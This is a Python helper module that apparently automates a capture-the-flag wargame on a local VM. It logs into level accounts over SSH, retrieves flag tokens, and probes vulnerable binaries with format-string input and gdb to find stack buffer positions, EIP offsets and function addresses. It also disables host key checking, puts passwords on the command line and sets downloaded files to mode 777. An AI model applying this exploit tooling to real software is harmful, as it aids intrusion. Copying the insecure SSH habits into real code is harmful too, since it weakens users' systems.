import os
import subprocess
import paramiko
from paramiko.client import SSHClient

from .base import save_token, get_current_level, get_previous_password, get_current_level_num, DEV_NULL, PIPE, PATTERN
from .config import VM_ADDRESS, VM_PORT
from .text import print_title, print_action, print_output


def connect(user: str, password: str):
    command = get_connect_command(user, password)
    print_title(f'Connect to {user}')
    print_action(command)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=VM_ADDRESS, username=user, password=password, port=VM_PORT)
    except OSError:
        print('Host is down, connection impossible')
        exit()
    return client


def get_connect_command(user, password):
    command = f'sshpass -p {password} ssh {user}@{VM_ADDRESS} -p {VM_PORT} -oStrictHostKeyChecking=no'
    return command


def connect_by_previous():
    current_level = get_current_level()
    password = get_previous_password()
    return connect(current_level, password)


def exec(client: SSHClient, command: str, title: str = None, err=False, read_method='readlines', silent=False):
    if title:
        print_title(title)
    if not silent:
        print_action(command)
    stdin, stdout, stderr = client.exec_command(command)
    read_from = 'stdout'
    if err:
        read_from = 'stderr'

    def read(stdin, stdout, stderr):
        return [line.strip() if read_method == 'readlines' else line for line in
                getattr(locals()[read_from], read_method)()]

    return read(stdin, stdout, stderr)


def exec_stream(command: str, stdin=False, stderr=False, stdout=False, password=None, title=None):
    if title:
        print_title(title)
    user = get_current_level()
    password = password if password else get_previous_password()
    connect_command = get_connect_command(user, password)

    def pipe_or_null(flag):
        return PIPE if flag else DEV_NULL

    command = f'{connect_command} {command}'
    print_action(command)
    stream = subprocess.Popen(
        command.split(" "), stderr=pipe_or_null(stderr), stdout=pipe_or_null(stdout), stdin=pipe_or_null(stdin))
    return stream


def exec_in_stream(stream, commands, title=None):
    if title:
        print_title(title)
    commands_inline = '\n'
    if isinstance(commands, list):
        commands_inline = bytes('\n'.join(commands) + '\n', 'utf-8')
        for c in commands:
            print_action(c, stdin=True)
    if isinstance(commands, str):
        print_action(commands, stdin=True)
        commands_inline = bytes(commands + '\n', 'utf-8')
    output = stream.communicate(input=commands_inline)
    if output[0]:
        try:
            return output[0].decode('utf-8')
        except:
            return None
    return None


def get_token(password):
    user = f'flag{get_current_level_num()}'
    client = connect(user, password)
    token_raw = exec(client, 'getflag', title='Cast get flag')[0]
    token = sanitize_token(token_raw)
    client.close()
    save_token(token)
    return token


def sanitize_token(token_raw: str):
    token = token_raw.split('token :')[1].strip()
    return token


def download_from(file_name: str, password=get_previous_password()):
    command = f'sshpass -p {password} scp -o StrictHostKeyChecking=no -o ' \
              f'UserKnownHostsFile=/dev/null -P {VM_PORT} {get_current_level()}@{VM_ADDRESS}:~/{file_name} .'
    print_title(f'Download file {file_name}')
    print_action(command)
    subprocess.call(command.split(' '), stderr=open(os.devnull, 'w'))
    os.chmod(file_name, 0o777)


def upload_to(file_name: str):
    command = f'sshpass -p {get_previous_password()} scp -o StrictHostKeyChecking=no -o ' \
              f'UserKnownHostsFile=/dev/null -P {VM_PORT} {file_name} {get_current_level()}@{VM_ADDRESS}:/tmp/'
    print_title(f'Upload file {file_name}')
    print_action(command)
    subprocess.call(command.split(' '), stderr=open(os.devnull, 'w'))


def find_buffer_position(client, stack_search_count=20, binary_name=get_current_level(), title=None):
    if title:
        print_title(title)
    test_str = '....'
    test_str_hex = test_str.encode('utf-8').hex()
    script = f'print "{test_str} " + "%x " * {stack_search_count}'
    stack = exec(client, f"python -c '{script}' | ./{binary_name}")[0]
    print_output(stack)
    buffer_position = 0
    for i, s in enumerate(stack.split(' ')):
        if s == str(test_str_hex):
            buffer_position = i
            break
    print_title(f'Buffer position: {buffer_position}')
    return buffer_position


def get_func_address(client, name, binary_name=get_current_level()):
    address = exec(
        client, f'echo "info func" | gdb ./{binary_name} -q | egrep " {name}$" | awk \'{{print $1}}\'',
        title=f'Get #{name} address')[0]
    return address


def find_offset(client, binary_name=get_current_level(), title=None, register='eip', pattern=PATTERN, env=None,
                stdin=False):
    if title:
        print_title(title)
    stdin_prefix = f'echo "{pattern}" | '
    address = exec(client, f'echo "y" | {stdin_prefix if stdin else ""}'
                           f'{env if env else ""} gdb ./{binary_name} -q '
                           f'-ex "r{"" if stdin else f" {pattern}"} " '
                           f'-ex "i r" '
                           f'-ex "q" | '
                           f'grep "{register}" | '
                           f'sed \'s/(gdb)//\' | '
                           f'awk \'{{print $2}}\''
                   )
    if address:
        address_short = bytes.fromhex(address[0].split('x')[1][:2]).decode('ascii')
        num = 65
        if address_short.islower():
            num = num + 6
        offset = (ord(address_short[0]) - num) * 4
        print_output(f'{offset}', f'{register.upper()} Offset')
        return offset
    return 0


def get_func_structure(client, name, binary_name=get_current_level(), title=None):
    structure = exec(client, f'echo "disass {name}" | gdb ./{binary_name} -q', title=f'Get #{name} structure')
    print_output(structure)
    if title:
        print_title(title)
    return structure
